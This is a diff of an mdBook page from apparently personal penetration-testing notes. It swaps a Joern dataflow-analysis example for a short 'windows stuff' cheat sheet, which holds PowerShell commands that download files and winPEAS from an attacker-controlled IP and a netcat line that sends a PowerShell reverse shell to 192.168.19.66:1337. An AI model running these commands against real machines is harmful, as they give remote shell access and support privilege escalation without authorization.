@@ -3,7 +3,7 @@
     <head>
         <!-- Book generated using mdBook -->
         <meta charset="UTF-8">
-        <title>./joern_badstrlen.md</title>
+        <title>./windows.md</title>
                 
 
         <!-- Custom HTML head -->
@@ -82,7 +82,7 @@
 
         <nav id="sidebar" class="sidebar" aria-label="Table of contents">
             <div class="sidebar-scrollbox">
-                <ol class="chapter"><li class="chapter-item expanded affix "><a href="android.html">./android.md</a></li><li class="chapter-item expanded affix "><a href="angr.html">./angr.md</a></li><li class="chapter-item expanded affix "><a href="arch.html">./arch.md</a></li><li class="chapter-item expanded affix "><a href="bash.html">./bash.md</a></li><li class="chapter-item expanded affix "><a href="git.html">./git.md</a></li><li class="chapter-item expanded affix "><a href="joern_badstrlen.html" class="active">./joern_badstrlen.md</a></li><li class="chapter-item expanded affix "><a href="libvirt_qemu_vagrant.html">./libvirt_qemu_vagrant.md</a></li><li class="chapter-item expanded affix "><a href="msfvenom.html">./msfvenom.md</a></li><li class="chapter-item expanded affix "><a href="old_stuff.html">./old_stuff.md</a></li><li class="chapter-item expanded affix "><a href="podman.html">./podman.md</a></li><li class="chapter-item expanded affix "><a href="pwn.html">./pwn.md</a></li><li class="chapter-item expanded affix "><a href="ruby.html">./ruby.md</a></li><li class="chapter-item expanded affix "><a href="rust.html">./rust.md</a></li><li class="chapter-item expanded affix "><a href="ssh.html">./ssh.md</a></li><li class="chapter-item expanded affix "><a href="windows.html">./windows.md</a></li><li class="chapter-item expanded affix "><a href="wireguard.html">./wireguard.md</a></li><li class="chapter-item expanded affix "><a href="wireguard_with_hop.html">./wireguard_with_hop.md</a></li><li class="chapter-item expanded affix "><a href="z3py.html">./z3py.md</a></li></ol>            </div>
+                <ol class="chapter"><li class="chapter-item expanded affix "><a href="android.html">./android.md</a></li><li class="chapter-item expanded affix "><a href="angr.html">./angr.md</a></li><li class="chapter-item expanded affix "><a href="arch.html">./arch.md</a></li><li class="chapter-item expanded affix "><a href="bash.html">./bash.md</a></li><li class="chapter-item expanded affix "><a href="git.html">./git.md</a></li><li class="chapter-item expanded affix "><a href="joern_badstrlen.html">./joern_badstrlen.md</a></li><li class="chapter-item expanded affix "><a href="libvirt_qemu_vagrant.html">./libvirt_qemu_vagrant.md</a></li><li class="chapter-item expanded affix "><a href="msfvenom.html">./msfvenom.md</a></li><li class="chapter-item expanded affix "><a href="old_stuff.html">./old_stuff.md</a></li><li class="chapter-item expanded affix "><a href="podman.html">./podman.md</a></li><li class="chapter-item expanded affix "><a href="pwn.html">./pwn.md</a></li><li class="chapter-item expanded affix "><a href="ruby.html">./ruby.md</a></li><li class="chapter-item expanded affix "><a href="rust.html">./rust.md</a></li><li class="chapter-item expanded affix "><a href="ssh.html">./ssh.md</a></li><li class="chapter-item expanded affix "><a href="windows.html" class="active">./windows.md</a></li><li class="chapter-item expanded affix "><a href="wireguard.html">./wireguard.md</a></li><li class="chapter-item expanded affix "><a href="wireguard_with_hop.html">./wireguard_with_hop.md</a></li><li class="chapter-item expanded affix "><a href="z3py.html">./z3py.md</a></li></ol>            </div>
             <div id="sidebar-resize-handle" class="sidebar-resize-handle"></div>
         </nav>
 
@@ -143,59 +143,30 @@
 
                 <div id="content" class="content">
                     <main>
-                        <pre><code>joern&gt; var bad_strlen = ({cpg.method
-         .name(&quot;(?i)strlen&quot;)
-         .callIn
-         .inAssignment
-         .target
-         .evalType(&quot;(g?)int&quot;)}).filter { c =&gt; c.lineNumber == Some(1385) }
+                        <h1 id="windows-stuff"><a class="header" href="#windows-stuff">windows stuff</a></h1>
+<h3 id="enumerate-windows-binaries-on-kali"><a class="header" href="#enumerate-windows-binaries-on-kali">enumerate windows-binaries on kali</a></h3>
+<pre><code>apt install windows-binaries
+dpkg -L windows-binaries
 </code></pre>
-<h1 id="using-reachableby--reachablebyflows"><a class="header" href="#using-reachableby--reachablebyflows">using <code>reachableBy</code> &amp; <code>reachableByFlows</code></a></h1>
-<pre><code class="language-c">// $ cat test/test.c
-#include &lt;stdio.h&gt;
-#include &lt;stdlib.h&gt;
-
-int getNumber() {
-    int number = atoi(&quot;8&quot;);
-    number = number + 10;
-    return number;
-}
-
-void *scenario1(int x) {
-    void *p = malloc(x);
-    return p;
-}
-
-void *scenario2(int y) {
-    int z = 10;
-    void *p = malloc(y * z);
-    return p;
-}
-
-void *scenario3() {
-    int a = getNumber();
-    void *p = malloc(a);
-    return p;
-}
+<h3 id="download-files-using-powershell"><a class="header" href="#download-files-using-powershell">download files using powershell</a></h3>
+<pre><code class="language-powershell">Invoke-WebRequest -Uri &quot;http://192.168.19.66:8000/downloadme&quot; -OutFile &quot;C:\Program Files (x86)\downloadme&quot;
 </code></pre>
-<pre><code>~/bin/joern/joern-cli/joern
-joern&gt; importCode(inputPath = &quot;test&quot;)
-joern&gt; run.ossdataflow
-joern&gt; def sink = cpg.method.callOut.name(&quot;malloc&quot;).argument
-joern&gt; def source = cpg.method.name(&quot;atoi&quot;).methodReturn
-joern&gt; sink.reachableBy(source).p
-joern&gt; sink.reachableByFlows(source).p
+<p>For example donwloading winpeas: The path <code>C:\users\public</code> is most of the times writable.</p>
+<pre><code class="language-powershell">Invoke-WebRequest -Uri &quot;http://192.168.19.66:8000/winPEASx64.exe&quot; -OutFile &quot;C:\users\public\winPEASx64.exe&quot;
+</code></pre>
+<h3 id="start-powershell-using-netcat"><a class="header" href="#start-powershell-using-netcat">start powershell using netcat`</a></h3>
+<pre><code>C:\users\public\nc.exe -e powershell.exe 192.168.19.66 1337
 </code></pre>
 
                     </main>
 
                     <nav class="nav-wrapper" aria-label="Page navigation">
                         <!-- Mobile navigation buttons -->
-                                                    <a rel="prev" href="git.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                                                    <a rel="prev" href="ssh.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                                 <i class="fa fa-angle-left"></i>
                             </a>
                         
-                                                    <a rel="next" href="libvirt_qemu_vagrant.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                                                    <a rel="next" href="wireguard.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                                 <i class="fa fa-angle-right"></i>
                             </a>
                         
@@ -205,11 +176,11 @@ joern&gt; sink.reachableByFlows(source).p
             </div>
 
             <nav class="nav-wide-wrapper" aria-label="Page navigation">
-                                    <a rel="prev" href="git.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                                    <a rel="prev" href="ssh.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                         <i class="fa fa-angle-left"></i>
                     </a>
                 
-                                    <a rel="next" href="libvirt_qemu_vagrant.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                                    <a rel="next" href="wireguard.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                         <i class="fa fa-angle-right"></i>
                     </a>
                             </nav>
